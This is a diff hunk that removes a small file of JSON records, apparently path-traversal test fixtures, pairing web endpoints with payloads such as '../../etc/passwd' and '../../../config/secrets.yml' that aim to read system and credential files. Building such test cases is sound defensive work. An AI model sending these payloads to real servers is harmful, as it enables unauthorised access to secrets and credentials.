@@ -1,9 +1,0 @@
-{"path":"/download","method":"GET","payload":{"file":"../../etc/passwd"}}
-
-{"path":"/api/files","method":"GET","payload":{"path":"../../../var/log/auth.log"}}
-
-{"path":"/view","method":"GET","payload":{"template":"../../../../windows/system32/drivers/etc/hosts"}}
-
-{"path":"/backup","method":"POST","payload":{"target":"../../../config/secrets.yml"}}
-
-{"path":"/export","method":"GET","payload":{"filename":"../../private/admin_credentials.txt"}}
